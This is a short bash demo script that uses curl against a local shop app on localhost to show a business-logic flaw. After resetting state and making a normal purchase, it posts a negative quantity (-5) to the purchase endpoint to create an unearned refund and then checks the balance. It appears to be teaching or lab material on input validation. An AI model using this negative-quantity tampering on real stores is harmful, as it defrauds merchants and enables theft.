#!/bin/bash
# Demo script to reproduce the business-logic flaw via curl
echo "Reset demo state and show initial balance:";
curl -s http://localhost:3000/reset | jq .
echo "Current balance:";
curl -s http://localhost:3000/balance | jq .

echo "\nMake a normal purchase (quantity 1):";
curl -s -X POST -H "Content-Type: application/json" -d '{"productId":1,"quantity":1}' http://localhost:3000/purchase | jq .

echo "\nExploit: send negative quantity (-5) to create a refund:";
curl -s -X POST -H "Content-Type: application/json" -d '{"productId":1,"quantity":-5}' http://localhost:3000/purchase | jq .

echo "\nBalance after exploit:";
curl -s http://localhost:3000/balance | jq .

echo "\nList orders:";
curl -s http://localhost:3000/orders | jq .

echo "\nDone."
